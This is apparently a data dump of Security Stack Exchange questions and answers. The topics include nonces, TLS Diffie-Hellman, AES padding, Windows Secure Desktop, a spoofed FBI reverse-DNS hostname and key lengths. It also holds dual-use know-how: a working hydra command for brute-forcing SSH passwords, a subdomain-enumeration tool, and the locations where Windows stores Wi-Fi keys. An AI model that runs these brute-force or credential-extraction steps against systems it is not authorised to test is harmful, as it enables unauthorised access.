<p>Should the encryption keys for password be human readable?  It depends.  There's only a limited number of ways to protect the key.  An encryption key is usually seen as an alphanumeric string that's hard to commit to to memory.  You can always encode/encrypt the key, but such methods doesn't deter someone that's smart enough to take a screen shot.  However, you can use simple ""keys"" (more like passwords) as input to a key expansion function.  In those instances, perhaps additional measures such as encoding adds some additional value relative to the cost of complexity.  </p>

<p>If anything, a good approach is to implement multiple layers of controls.  Preventative controls are more difficult while detective controls are generally easier to implement.  Separating key files could simplify the overall architecture and implementation of controls.  Regardless of whether preventative or detective controls are used, enabling some auditing functions is a must along with review of audit logs.  This way, should the improbable happen (access to key), you can take corrective action.  </p>
","15055"
"Windows groups and permissions: Authenticated Users group meaning","40047","","<p>What is the purpose of the ""Authenticated Users"" group in Windows?
Under Linux it doesn't exist and I'm starting to think this is another idiosyncrasy or over-engineering of the Windows operating system.</p>

<p>Here is why:</p>

<p>Assume I want to know what rights has the user Mike on disk C:\, I will type:</p>

<pre><code>net user mike
</code></pre>

<p>and will be returned:</p>

<pre><code>User name                    mike
Full Name                    
Comment                      
User's comment               
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            7/13/2013 7:55:45 AM
Password expires             Never
Password changeable          7/13/2013 7:55:45 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   7/13/2013 7:53:58 AM

Logon hours allowed          All

Local Group Memberships      *Users            
Global Group memberships     *None
</code></pre>

<p>I therefore assume the user mike belongs to group Users only, so I will check the security tab with a right click on the disk C and will see that users belonging to the ""Users"" group cannot modify the disk c but only read it.</p>

<p>Surprise surprise however, user mike will be able to write to C:\ !!!
Why? because the command net cannot know it but mike also belongs to the Authenticated Users group which has right to write on C:!!</p>

<p>Can someone confirm the above story, comment whether it makes any sense or as I doubt it is a case of over-engineering and elaborate on the reasons behind this?</p>

<p><strong>EDIT:</strong> </p>

<p>Notice the net command correctly shows groups if I create a new group and add user mike to it.</p>

<pre><code> net localgroup testgroup /add
 net localgroup testgroup mike 
 net user mike
</code></pre>

<p>returns </p>

<pre><code>[*]
Local Group Memberships      *Users     *testgroup       
Global Group memberships     *None
</code></pre>
","<p>There are a number of special groups in Windows. Included among these are <code>Authenticated Users</code>, <code>Interactive Users</code>, <code>Everyone</code>, etc. These days, <code>Everyone</code> and <code>Authenticated Users</code> are effectively equivalent for most purposes, but if you had a pre-2003 domain level domain that would not be true.</p>

<p>In any event, there is no way to observe the membership of these groups. In a sense the membership is calculated when a SACL or DACL is processed.</p>

<p>That said, it seems strange to me that you would be assigning permissions in the file system to authenticated users, especially <code>C:\</code>.  A more appropriate setting would be <code>Interactive Users</code> or, if you're locking down workstations, read only.</p>

<p>The technical definitions of these two, according to Microsoft, are:</p>

<p>Authenticated Users:</p>

<blockquote>
  <p>Any user accessing the system through a logon process has the Authenticated Users identity. This identity allows access to shared resources within the domain, such as files in a shared folder that should be accessible to all the workers in the organization.</p>
</blockquote>

<p>Everyone:</p>

<blockquote>
  <p>All interactive, network, dial-up, and authenticated users are members of the Everyone group. This special identity group gives wide access to a system resource.</p>
</blockquote>

<p>You can find these for yourself, along with all others, here:  <a href=""http://technet.microsoft.com/en-us/magazine/dd637754.aspx"" rel=""nofollow noreferrer"">http://technet.microsoft.com/en-us/magazine/dd637754.aspx</a></p>
","38888"
"How can I find subdomains of a site?","40014","","<p>One of the things I need to do from time to time is to find subdomains of a site for example.</p>

<blockquote>
  <p>Starting with <strong>example.com</strong></p>
  
  <ul>
  <li>sub1.example.com</li>
  <li>other.example.com</li>
  <li>another.example.com</li>
  </ul>
</blockquote>

<p>I'm looking for any additional ways to perform recon on these targets and I want to get a list of all the subdomains of a domain.</p>

<p>I'm currently doing a number of things inlcuding</p>

<ul>
<li>using maltego to crawl for info</li>
<li>Using search engines to search for subdomains</li>
<li>crawling site links</li>
<li>Examining DNS records</li>
<li>Examining incorrectly configured SSL certificates</li>
<li>Guessing things like <em>'vpn.example.com'</em> </li>
</ul>

<p>I reckon there are more than the ones i've found so far, but now I'm out of ideas.</p>
","<p>As a pentester being able to find the subdomains for a site comes up often.  So I wrote a tool,  <a href=""https://github.com/TheRook/subbrute"">SubBrute</a> that does this quite well if I do say so my self.  In short, this is better than other tools (fierce2)  in that its <strong>a lot faster, more accurate and easier to work with</strong>.  This tool comes with a list of real subdomains obtained from spidering the web.  This subdomain list is more than 16 times the size of fierce2 and subbrute will take about 15 minutes to exhaust this list on a home connection.  The output is a clean newline separated list, that is easy to use as the input for other tools like nmap or a web application vulnerability scanner.</p>
","35365"
"Brute-force an SSH-login that has only a 4-letter password","39882","","<p>Suppose, you know that a certain computer is only protected by such a short password, then you could just try every possible combination easily.</p>

<p>How would a script look like, that tries to crack that password?</p>

<p>Something like </p>

<pre><code>#!/bin/bash
wordlist=create_wordlist(); # external defined
for i in $(cat $wordlist); do
  echo ssh username@localhost pipe password $i here; 
done
</code></pre>

<p><em>(I know, this is not a good example but my bash skills are not that good yet)</em></p>
","<p><code>hydra</code> can generate the passwords for you. No need to generate them separately if you will be using brute force:</p>

<pre><code>hydra -l user_name -V -x 4:4:aA1 ip_address ssh
</code></pre>

<p>-V means verbose, <code>-x 4:4:aA1</code> means min is 4 letters, max is 4 letters. List of letters is a-z denoted by a, A-Z denoted by A, 0-9 denoted by 1. You can add other characters like <code>%_-+/</code> </p>

<p>You need to wrap apostrophes around the -x option if you add special characters like space, ^,&amp;,* or "":</p>

<pre><code>hydra -t 128 -l user_name -V -x '4:4:aA1""@#$!()=`~?&gt;&lt;;:%^&amp;*_-+/,.\ ' localhost ssh
</code></pre>
","43390"
"What is the use of a client nonce?","39822","","<p>After reading Part I of Ross Anderson's book, <em>Security Engineering</em>, and clarifying some topics on Wikipedia, I came across the idea of Client Nonce (cnonce). Ross never mentions it in his book and I'm struggling to understand the purpose it serves in user authentication.</p>

<p>A normal nonce is used to avoid replay attacks which involve using an expired response to gain privileges. The server provides the client with a nonce (Number used ONCE) which the client is forced to use to hash its response, the server then hashes the response it expects with the nonce it provided and if the hash of the client matches the hash of the server then the server can verify that the request is valid and fresh. This is all it verifies; <em>valid and fresh</em>.</p>

<p>The explanations I've found for a client nonce however are less straight forward and questionable. The Wikipedia page for Digital access authentication and several responses here on Stackoverflow seem to suggest that a client nonce is used to avoid chosen-plaintext attacks. I have several problems with this idea:</p>

<ul>
<li>If a person can sniff and insert packets, the greatest vulnerability is a man-in-the-middle attack which neither a nonce nor a cnonce can overcome, therefore making both meaningless.</li>
<li>Assuming for a second that the attacker doesn't want to engage in a man-in-the-middle attack and wants to recover the authentication details, how does a cnonce provide additional protection? If the attacker intercepts communication and replies to a request with its own nonce, then the response from the client will be a hash of the nonce, data and cnonce in addition to the cnonce in unencrypted form. Now the attacker has access to the nonce, cnonce and the hash. The attacker can now hash its rainbow tables with the nonce and cnonce and find a match. Therefore the cnonce provides zero additional protection.</li>
</ul>

<p>So what is the purpose of a cnonce?</p>

<p>I assume there is some part of the equation I'm not understanding but I haven't yet found an explanation for what that part is.</p>

<p><strong>EDIT</strong> Some answers have suggested that the client can provide a nonce and it will serve the same purpose. This breaks the challenge-response model however, what are the implications of this?</p>
","<p>A <em>nonce</em> is a unique value chosen by an entity in a protocol, and it is used to protect that entity against attacks which fall under the very large umbrella of ""replay"".</p>

<p>For instance, consider a password-based authentication protocol which goes like this:</p>

<ul>
<li>server sends a ""challenge"" (a supposedly random value <em>c</em>) to the client</li>
<li>client shall respond by sending <em>h(c || p)</em> where <em>h</em> is a secure hash function (e.g. SHA-256), <em>p</em> is the user password, and '<em>||</em>' denotes concatenation</li>
<li>server looks up the password in its own database, recomputes the expected client response, and sees if it matches what the client sent</li>
</ul>

<p>Passwords are secret values which fits in human brains; as such, they cannot be very complex, and it is possible to build a big dictionary which will contain the user password with high probability. By ""big"" I mean ""can be enumerated with a medium-scale cluster in a few weeks"". For the current discussion, we accept than an attacker will be able to break a single password by spending a few weeks of computation; this is the security level that we want to achieve.</p>

<p>Imagine a passive attacker: the attacker eavesdrops but does not alter the messages. He sees <em>c</em> and <em>h(c || p)</em>, so he can use his cluster to enumerate potential passwords until a match is found. This will be expensive for him. If the attacker wants to attack <em>two</em> passwords then he must do the job <em>twice</em>. The attacker <em>would like</em> to have a bit of cost sharing between the two attack instances, using <em>precomputed tables</em> (""rainbow tables"" are just a kind of precomputed table with optimized storage; but building a rainbow table still requires enumerating the complete dictionary and hashing each password). However, the random challenge defeats the attacker: since each instance involves a new challenge, the hash function input will be different for every session, even if the same password is used. Thus, the attacker cannot build useful precomputed tables, in particular rainbow tables.</p>

<p>Now suppose that the attacker becomes active. Instead of simply observing the messages, he will actively alter messages, dropping some, duplicating others, or inserting messages of its own. The attacker can now intercept a connection attempt from the client. The attacker chooses and sends his own challenge (<em>c'</em>) and waits for the client response (<em>h(c' || p)</em>). Note that the true server is not contacted; the attacker just drops the connection abruptly immediately after the client response, so as to simulate a benign network error. In this attack model, the attacker has made a big improvement: he still has a challenge <em>c'</em> and the corresponding response, but the challenge is a value that the attacker has chosen as he saw fit. What the attacker will do is always server the same challenge <em>c'</em>. Using the same challenge every time allows the attacker to perform precomputations: he can build precomputed tables (i.e. rainbow tables) which use that special ""challenge"". Now the attacker can attack several distinct passwords without incurring the dictionary-enumeration cost for each.</p>

<p>A <em>client nonce</em> avoids this issue. The protocol becomes:</p>

<ul>
<li>server sends a random challenge <em>c</em></li>
<li>client chooses a nonce <em>n</em> (should be distinct every time)</li>
<li>client sends <em>n || h(c || n || p)</em></li>
<li>server recomputes <em>h(c || n || p)</em> (using the <em>p</em> from its database) and sees if this value matches what the client sent</li>
</ul>

<p>Since the client includes a new random value (the ""nonce"") in the hash function input for each session, the hash function input will be distinct every time, even if the attacker can choose the challenge. This defeats precomputed (rainbow) tables and restores our intended security level.</p>

<p>A crude emulation of a unique nonce is the user name. Two distinct users within the same system will have distinct names. However, the user will keep his name when he changes his password; and two distinct users may have the same name on two distinct systems (e.g. every Unix-like system has a ""root"" user). So the user name is not a good nonce (but it is still better than having no client nonce at all).</p>

<p>To sum up, the client nonce is about protecting the client from a replay attack (the ""server"" being in fact an attacker, who will send the same challenge to every client he wishes to attack). This is not needed if the challenge is executed over a channel which includes strong server authentication (such as SSL). <a href=""http://en.wikipedia.org/wiki/Password-authenticated_key_agreement"">Password Authenticated Key Exchange</a> are advanced protocols which ensure mutual password-based authentication between client and server, without needing some a priori trust (the ""root certificates"" when a SSL client authenticates the SSL server certificate) and protecting against active and passive attackers (including the ""cluster-for-two-weeks"" attack on a single password, so that's strictly better than the protocol above, nonce or no nonce).</p>
","3024"
"How does the Windows ""Secure Desktop"" mode work?","39757","","<p>Can anyone explain (or provide a link to a simple explanation) of what the Windows ""Secure Desktop"" mode is and how it works?</p>

<p>I just heard about it in the KeePass documentation (<a href=""http://keepass.info/help/base/security.html#secdesktop"">KeePass - Enter Master Key on a Secure Desktop</a>) and would like to understand it better.</p>
","<p><strong>Short answer</strong></p>

<p>There are three, separate issues claiming the name of ""Secure Desktop"":</p>

<ul>
<li>Windows builtin functions like GINA and the <a href=""http://msdn.microsoft.com/en-us/magazine/cc163489.aspx"" rel=""noreferrer"">Credential Provider Model</a>.</li>
<li>Separation of privileged vs unprivileged applications running as the same user (nominally prevent privilege escalation), which may or may not be related to:</li>
<li><code>SwitchDesktop()</code>, which is what KeePass is using and may or may not (I'm not sure) be resistant to DLL Injection.</li>
</ul>

<p><strong>Detailed answer</strong></p>

<p>As a quick primer to how Windows GUIs are built, basically everything runs through a function called <code>CreateWindow()</code> (I mean everything, every button, every menu, everything) and is given a <code>hWnd</code> or Window Handle. Modifying these Windows is done via another function, <code>SendMessage()</code>.</p>

<p>Here's the catch. As a user mode application, making the right API calls I can fairly easily send messages to other Windows. It's fairly trivial to make buttons disappear from other people's forms. It is a little harder to perform DLL injection and hook the message loop that receives messages (the OS sends Windows messages when things happen to them) but not that much harder. If I can hook those events, I could automatically submit your ""yes/no"" form. Or, I could change the label from <code>ReallyDodgyVirus.exe</code> to <code>explorer.exe</code> and you'd be none the wiser.</p>

<p><em>Insert</em>: <a href=""http://www.codeproject.com/KB/threads/winspy.aspx"" rel=""noreferrer"">A really good article</a> on the various techniques of getting your code into the address space of a running process.</p>

<p>Now, what are KeePass doing?</p>

<p>A very brief perusal of the source shows they are using <code>CreateDesktop()</code>, <code>SwitchDesktop()</code> and <code>CloseDesktop()</code> to create a second desktop connected to the physical viewing device you're on. In English, they're asking the kernel to create for them an isolated desktop whose <code>hWnd</code> objects are outside of the findable range of any other application's <code>SendMessage()</code>. </p>

<p>I should point out that <code>SwitchDesktop</code> suspends the updating of the UI of the default desktop. I'm not sure if the message loops are also frozen - I suspect not since the desktop is created as a new thread.</p>

<p>In this instance, KeePass <em>is</em> drawing the UI, so the execution is <em>not</em>, as I understand it, as <code>NT AUTHORITY/SYSTEM</code>. Instead, the new desktop is created in isolation from basically the rest of the current desktop, which protects it. I'll be happy to be corrected on that. However, see the <a href=""http://msdn.microsoft.com/en-us/library/ms686347%28v=vs.85%29.aspx"" rel=""noreferrer"">MSDN for SwitchDesktop</a>:</p>

<blockquote>
  <p>The SwitchDesktop function fails if the desktop belongs to an invisible window station. SwitchDesktop also fails when called from a process that is associated with a secured desktop such as the WinLogon and ScreenSaver desktops. Processes that are associated with a secured desktop include custom UserInit processes. Such calls typically fail with an ""access denied"" error.</p>
</blockquote>

<p>I believe this means that these dialogs (screensavers, Windows Logon) are built more deeply into Windows such that they always execute as <code>NT AUTHORITY\SYSTEM</code> and the <code>UserInit</code> process creates the sub processes on valid authentication at the required privilege level.</p>

<p>The reason I bring this up is because I believe there are two issues: different desktops and privilege separation. From Mark Russinovich's <a href=""http://www.tjscott.net/winsecurity/win7.uac.ross.pdf"" rel=""noreferrer"">discussion of the topic of Secure Desktop</a>:</p>

<blockquote>
  <p>The Windows Integrity Mechanism and UIPI were designed to create a protective barrier around
  elevated applications. One of its original goals was to prevent software developers from taking
  shortcuts and leveraging already-elevated applications to accomplish administrative tasks. An
  application running with standard user rights cannot send synthetic mouse or keyboard inputs
  into an elevated application to make it do its bidding or inject code into an elevated application
  to perform administrative operations.</p>
</blockquote>

<p>As SteveS says, UAC runs a separate desktop process as <code>NT AUTHORITY/SYSTEM</code>. If you can catch UAC in action (<code>consent.exe</code>) via process explorer, it looks like this:</p>

<p><img src=""https://i.stack.imgur.com/Sf2bt.png"" alt=""UAC under process explorer""></p>

<p>Escalating privileges as a process I don't have the specifics of, but here is what I think I understand: I believe the process of privilege escalation in the Windows API causes a process running as <code>NT AUTHORITY/SYSTEM</code> (therefore able to execute the new process under whatever privileges it wants to, in this case an Administrator). When an application asks for higher privileges, that question is asked to you on a new desktop locally, to which none of your applications can get either the Desktop Handle or any of the GUI element handles. When you consent, <code>consent.exe</code> creates the process as the privileged user. Thus, the process running as <code>NT AUTHORITY\SYSTEM</code> is a consequence of the need to create a new privileged process, not as a method of creating a secure desktop. <strong>The fact the desktop is different to the default is what adds security in both cases.</strong></p>

<p>I believe what Mark means above is that, in addition to these secure desktops, two things are happening:</p>

<ul>
<li>Your default administrator desktop is in fact running unprivileged, contrary to Windows XP and earlier and</li>
<li>Unprivileged and privileged applications now exist on separate desktops (disclaimer: could just be ACLs on the objects in memory, I'm not sure), ensuring that unprivileged code can't access privileged objects. </li>
</ul>

<p>The Windows Logon UI is different again in Vista/7.</p>

<p>Clearly, none of these methods will defend you against kernel mode rootkits, but they do prevent privilege escalation and UI integrity compromise by isolating privileged applications, or in the case of KeePass, the sensitive dialog.</p>

<p><strong>Edit</strong></p>

<p>Having looked harder at the KeePass code, I saw this handy piece of C#:</p>

<pre><code>Bitmap bmpBack = UIUtil.CreateScreenshot();
if(bmpBack != null) UIUtil.DimImage(bmpBack);
/* ... */

SecureThreadParams stp = new SecureThreadParams();
stp.BackgroundBitmap = bmpBack;
stp.ThreadDesktop = pNewDesktop;
</code></pre>

<p>From this you can see that in fact in order to mimic consent.exe, KeePass takes a screenshot of the background, dims it and creates its new desktop with the background of the old desktop. I therefore suspect the old desktop continues running even while it isn't being rendered. This I think confirms that no magic <code>NT AUTHORITY\SYSTEM</code> action is happening both with KeePass and <code>consent.exe</code> (I suspect consent.exe is doing the same thing UI-wise, it just happens to be launched in the context of <code>NT AUTHORITY\SYSTEM</code>).</p>

<p><strong>Edit 2</strong></p>

<p>When I say DLL Injection, I'm specifically thinking of DLL injection to corrupt the UI. DLL Injection remains possible on KeePass as a process, I'm just not sure whether it could be used to influence that secure UI. It could, however, be used to access the memory of the process and its threads, thereby grabbing the entered password pre-encryption. Hard, but I think possible. I'd appreciate someone advising on this if they know.</p>
","3762"
"AES CBC padding when the message length is a multiple of the block size","39591","","<p>Assuming that a 32-byte plaintext is encrypted by AES 128 CBC - is it mandatory to add 16-byte padding, according to the different padding schemes?</p>
","<p>Padding is a way to encrypt messages of a size that the block cipher would not be able to decrypt otherwise; it is a <em>convention</em> between whoever encrypts and whoever decrypts. If your input messages always have a length which can be processed with your encryption mode (e.g. your messages always have a length multiple of 16) then you do not have to add padding -- <em>as long as</em> during decryption, you do not try to look for a padding when there is none. If <em>some</em> of your messages require padding, then you will have to add some sort of padding systematically, otherwise decryption will be ambiguous.</p>

<p>Padding does not add security. Badly implemented padding <em>management</em> can leak information (<a href=""http://en.wikipedia.org/wiki/Padding_oracle_attack"">padding oracles</a>) so you have to be careful with your implementation -- preferably by not doing it yourself.</p>

<p>(Of course, you would be better served with an encryption mode which does not need any padding <em>and</em> includes the much needed but much overlooked integrity check; that would mean <a href=""http://en.wikipedia.org/wiki/Galois/Counter_Mode"">GCM</a> or <a href=""http://en.wikipedia.org/wiki/EAX_mode"">EAX</a>, not CBC.)</p>
","29999"
"Should I be concerned if the ""FBI"" has logged onto my Ubuntu VPS?","39473","","<p>Yesterday, I was performing a bit of general maintenance on a VPS of mine, using the IPMI console my host provided.</p>

<p>Upon setting up SSH keys again via the IPMI console, I logged in via SSH and was shocked to see this:</p>

<pre><code>Welcome to Ubuntu 14.04.2 LTS (GNU/Linux 2.6.32-042stab116.2 x86_64)
Documentation:  https://help.ubuntu.com/
Last login: Sat Sep 17 04:39:57 2016 from ic.fbi.gov
</code></pre>

<p>Immediately, I contacted my hosting company. They said that they didn't know why this might be, and that it's possible the hostname was spoofed. </p>

<p>I did a bit more digging, and resolved ic.fbi.gov to an IP address.</p>

<p>I then ran this on the system:</p>

<pre><code>last -i
</code></pre>

<p>This returned my IP address, and then two other IP addresses which were unknown to me. I geoIP'd these two IP addresses. One of them was a VPN and the other was a server from a hosting company in the state of Washington.</p>

<p>Again, the IP that I resolved ic.fbi.gov to was not on the list.</p>

<p>Do you think I should be concerned/worried about the ""FBI"" obtaining access to my VPS? Or is it just some casual hacker that spoofed the hostname?</p>

<p>Side-note: Yes, I am more than aware this is a compromisation, but I'm more concerned about the hostname. I am from the UK and my VPS (was) located in the US.</p>
","<p>An IP address can be set up in DNS to resolve to any host name, by whoever is in control of that IP address.</p>

<p>For example, if I am in control of the netblock 203.0.113.128/28, then I can set up 203.0.113.130 to reverse-resolve to <code>presidential-desktop.oval-office.whitehouse.gov</code>. I don't need control of <code>whitehouse.gov</code> to do this, though it can help in some situations (particularly, with any software that checks to make sure reverse and forward resolution <em>matches</em>). That wouldn't mean that the president of the United States logged into your VPS.</p>

<p>If someone has access to your system, they can change the resolver configuration which will effectively enable them to resolve any name to any IP address, or any IP address to any name. (If they have that level of access, they can wreak all kinds of other havoc with your system as well.)</p>

<p>Unless and until you verify that the IP address that was used to log in actually is registered to the FBI, <strong>don't worry about the host name being one under <code>fbi.gov</code>.</strong> That name mapping may very well be faked. <strong><em>Worry instead that there has been a successful login to your account that you cannot explain, from an IP address that you don't recognize.</em></strong></p>

<p>Chances are that if the FBI wanted the data on your VPS, they would use a <em>somewhat less obvious approach</em> to get it.</p>

<p><strong><em>You should worry, but not about the fbi.gov hostname.</em></strong></p>

<p>Go read <a href=""https://serverfault.com/q/218005/58408"">How do I deal with a compromised server?</a> on Server Fault, and <a href=""https://security.stackexchange.com/q/24195/2138"">How do you explain the necessity of “nuke it from orbit” to management and users?</a> here on Information Security. Really, do it. Do it now; don't put it off.</p>
","137099"
"How to get a Network's WIFI Password through CMD?","39377","","<p>I found that Wifi's Password can be retrived using the network and sharing wizard in Windows, And Technicaly theres no way to store Passwords/collection of bytes in the memory after switching/shutting down your computer, and So the Network and Sharing Wizard is also an application, and it has to store the password any way, so it saves the password in the disk, so there must be a way in which i can get the password using CMD, or if not with CMD where can i get that key, I'm trying to learn hacking my Wifi system, I use c++, with Win32 and i dont need any other libray than win32, I will implement command shell in my application, im doing this just for a knowledge about windows computer security, So is there anyone reading this question tells the way using the command prompt to get the Wirless Network/Wifi Password? Or any other way in which i can get that key in my application even through parsing a system file/searching in registry(for example) or any thing, i can even be happier if i got the WPA/PSK encrypted key if not the ascii version of the key, Thanks in Advance!</p>
","<p>Windows stores these encrypted in the following locations:</p>

<blockquote>
  <p>In Windows XP, wireless keys are stored in the Registry under <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WZCSVC\Parameters\Interfaces\[Interface Guid]</code>. The [Interface Guid] is a unique GUID value the represents your wireless network card. The keys are well-encrypted by Windows operating system, so you cannot watch them with RegEdit.</p>
  
  <p>In Windows Vista, wireless keys are stored in the file system under <code>c:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\[Interface Guid]</code>. The [Interface Guid] is a unique GUID value the represents your wireless network card. The keys are stored and well-encrypted inside the .xml files that you can find in the above path.</p>
</blockquote>

<p>Via <a href=""http://www.nirsoft.net/utils/wireless_wep_key_faq.html"" rel=""nofollow"">Nirsoft</a></p>
","74246"
"Diffie-Hellman and its TLS/SSL usage","39360","","<p>I'm struggling to understand the (non-)use of Diffie-Hellman (DH) in TLS.</p>

<ul>
<li>DH has been around for a long time now, why does almost nobody use it, yet?</li>
<li>DH is only being used for ""key sharing"", why does nobody use the DH secret to encrypt everything? Why do we need a symmetric key, when we already have a DH secret, that is good enough to transport yet another secret? That also applies to SSH (not?). I think there's a simple answer to that, but I couldn't find it.</li>
</ul>
","<p>Diffie-Hellman <em>is</em> used in SSL/TLS, as ""ephemeral Diffie-Hellman"" (the cipher suites with ""DHE"" in their name; see <a href=""http://tools.ietf.org/html/rfc5246#section-7.4.3"" rel=""noreferrer"">the standard</a>). What is very rarely encountered is ""static Diffie-Hellman"" (cipher suites with ""DH"" in their name, but neither ""DHE"" or ""DH_anon""): these cipher suites require that the server owns a <em>certificate</em> with a DH public key in it, which is rarely supported for a variety of historical and economical reasons, among which the main one is the availability of a free standard for RSA (<a href=""http://tools.ietf.org/html/rfc3447"" rel=""noreferrer"">PKCS#1</a>) while the corresponding standard for Diffie-Hellman (<a href=""http://webstore.ansi.org/RecordDetail.aspx?sku=ANSI%20X9.42-2003%20%28R2013%29"" rel=""noreferrer"">x9.42</a>) costs a hundred bucks, which is not much, but sufficient to deter most amateur developers.</p>

<p>Diffie-Hellman is a <a href=""http://en.wikipedia.org/wiki/Key-agreement_protocol"" rel=""noreferrer"">key agreement protocol</a>, meaning that if two parties (say, the SSL client and the SSL server) run this protocol, they end up with a shared secret <em>K</em>. However, neither client or server gets to <em>choose</em> the value of <em>K</em>; from their points of view, <em>K</em> looks randomly generated. It is <em>secret</em> (only them know <em>K</em>; eavesdroppers on the line do not) and <em>shared</em> (they both get the same value <em>K</em>), but not <em>chosen</em>. This is not encryption. A shared secret <em>K</em> is good enough, though, to process terabytes of data with a symmetric encryption algorithm (same <em>K</em> to encrypt on one side and decrypt on the other), and that is what happens in SSL.</p>

<p>There is a well-known <strong>asymmetric encryption</strong> algorithm called RSA, though. With RSA, the sender can encrypt a message <em>M</em> with the recipient's public key, and the recipient can decrypt it and recover <em>M</em> using his private key. This time, the sender <em>can</em> choose the contents <em>M</em>. So your question might be: in a RSA world, why do we bother with AES at all ? The answer lies in the following points:</p>

<ul>
<li><p>There are constraints on <em>M</em>. If the recipient's public key has size <em>n</em> (in bytes, e.g. <em>n = 256</em> for a 2048-bit RSA key), then the maximum size of <em>M</em> is <em>n-11</em> bytes. In order to encrypt a longer message, we would have to split it into sufficiently small blocks, and include some reassembly mechanism. Nobody really knows how to do that <em>securely</em>. We have good reasons to believe that RSA on a single message is safe, but subtle weaknesses can lurk in any split-and-reassembly system and we are not comfortable with that. It is already bad enough with <a href=""http://en.wikipedia.org/wiki/Block_cipher_mode_of_operation"" rel=""noreferrer"">symmetric ciphers</a>, where the mathematical situation is simpler.</p></li>
<li><p>Even if we could handle the splitting-and-reassembly, there would be a size expansion. With a 2048-bit RSA key, an internal message chunk has size at most 245 bytes, but yields, when encrypted, a 256-byte sequence. This wastes our lifeforce, i.e. network bandwidth. Symmetric encryption incurs only a bounded overhead (well, SSL adds a slight overhead proportional to the data size, but it is much smaller than what would occur with a RSA-only protocol).</p></li>
<li><p>Compared to AES, RSA is slow as Hell.</p></li>
<li><p>We really like to have the option of using key agreement protocols like DH instead of RSA. In older times (before 2001), RSA was patented but not DH, so the US government was recommending DH. Nowadays, we want to be able to switch algorithms in case one becomes broken. In order to support key agreement protocols, we need some symmetric encryption, so we may just as well use it with RSA. It simplifies implementation and protocol analysis.</p></li>
</ul>

<p>See <a href=""https://security.stackexchange.com/questions/20803/how-does-ssl-work/20847#20847"">this answer</a> for a detailed description of how SSL works.</p>
","41226"
"What does ""key with length of x bits"" mean?","39332","","<p>I'd like to know what it means to say ""the cryptosystem C uses keys with a length of x bits"". I do not understand what the bits length means... doesn't it depend on the encoding? The same word encodes to bit strings of different lengths in utf8, iso and unicode, so is there a general encoding used to define the length of a key? Or does ""length of x bits"" mean something completely different?</p>
","<p>For <strong>symmetric algorithms</strong> (<a href=""http://en.wikipedia.org/wiki/Symmetric-key_algorithm"">symmetric encryption</a>, <a href=""http://en.wikipedia.org/wiki/Message_authentication_code"">Message Authentication Code</a>), a key is a sequence of bits, such that any sequence of the right length is a possible key. For instance, <a href=""http://en.wikipedia.org/wiki/Advanced_Encryption_Standard"">AES</a> is a symmetric encryption algorithm (specifically, a <a href=""http://en.wikipedia.org/wiki/Block_cipher"">block cipher</a>) which is defined over keys of 128, 192 and 256 bits: any sequence of 128, 192 or 256 bits can be used as a key. How you encode these bits is not relevant here: regardless of whether you just dump them raw (8 bits per byte), or use Base64, or hexadecimal, or infer them from a character string, or whatever, is up to you.</p>

<p>There are a few gotchas with some algorithms. The prime example is <a href=""http://en.wikipedia.org/wiki/Data_Encryption_Standard"">DES</a>, a predecessor to AES. DES is <em>defined</em> to use a 64-bit key. However, if you look at the algorithm definition, you see that only 56 of these bits are used; the other 8 are simply ignored (if you number bits from 1 to 64, these are bits 8, 16, 24, 32, 40, 48, 56 and 64; they are supposed to be ""parity bits"" depending on the 56 others, but nobody really bothers with setting or checking them). So it is often said that DES has a <em>56-bit key</em>. This is because key length is related to security: if an algorithm accepts keys of length <em>n</em> bits, then there are <em>2<sup>n</sup></em> possible keys, and thus trying them all (attack known as ""exhaustive search"" or ""brute force"") has time proportional to <em>2<sup>n</sup></em> (with <em>n</em> big enough, i.e. more than about 85, this is technologically infeasible). In that sense, DES offers the security of a 56-bit key (<em>2<sup>56</sup></em> ""really distinct"" possible keys). Yet, if you use a library implementing DES, that library will expect DES keys as sequences of 64 bits (often provided as 8 bytes).</p>

<p>Another algorithm with a special rule is <a href=""http://tools.ietf.org/html/rfc2268"">RC2</a>. It accepts keys of length 8 to 128 bits (multiple of 8 only); but it also has an extra parameter called <em>effective key length</em> denoted by ""T1"". In the middle of the processing of the key, an internal value is ""reduced"" to a sequence of T1 bits, which means that subsequent encryption will depend only on the values of T1 specific bits in that internal value. The resistance of RC2 against exhaustive search is then no more than that offered by a T1-bit key, because one can try all possible sequences of T1 bits for that internal value. Yet, RC2 still has an actual key length (the length of the sequence of bits which is provided as key) which can be greater than T1.</p>

<p>For <strong>asymmetric algorithms</strong> (also known as <a href=""http://en.wikipedia.org/wiki/Public-key_cryptography"">public-key cryptography</a>, encompassing asymmetric encryption, digital signatures, some key exchange protocols, and a few more esoteric algorithms), keys work by <em>pairs</em> consisting in a public key and a private key. These keys are mathematical objects with some heavy internal structure. The ""key length"" is then a conventional measure of the size of one of the involved mathematical objects.</p>

<p>For instance, a RSA public key contains a big integer called the <em>modulus</em>, as well as an other integer (usually small) called the <em>public exponent</em>. When we say a ""1024-bit RSA key"", we mean that the modulus has length 1024 bits, i.e. is an integer greater than <em>2<sup>1023</sup></em> but lower than <em>2<sup>1024</sup></em>. Such an integer could be encoded as a sequence of 1024 bits, i.e. 128 bytes. Yet, the public key must also contain the public exponent, so the actual encoded length will be greater. And the private key is, on a theoretical point of view, knowledge of how the modulus can be factored in prime numbers; the traditional encoding for that knowledge is that of the prime factors, along with a bunch of helper values which could be recomputed from the factors (but that would be slightly expensive) and may help in executing the algorithm faster.</p>

<p>For distinct key types which work over distinct mathematics, other ""lengths"" are used, so you cannot directly compare security of algorithms by simply comparing the key lengths. A 256-bit <a href=""http://en.wikipedia.org/wiki/ECDSA"">ECDSA</a> key is vastly more secure than a 768-bit RSA key. Also, the mathematical structure inherent to public/private key pairs allows for much faster attacks than simply trying out bunch of random bits, and there are many subtle details. See <a href=""http://www.keylength.com/"">this site</a> for explanations and online calculators for the various set of rules about comparing key sizes that many regulatory organizations have come up with.</p>
","8914"
"Access router if you don't know password","39306","","<p>At home I have a wireless cisco router. Unfortunately I wasn't smart to change its ip or passwords. So anyone who is connected to it can access 192.168.0.1 and log in as admin using password admin and do whatever they like.<br>
However in order to connect to my router you have to enter the password which was blahblahblahblahblah (yes it is word blah repeated 5 times).</p>

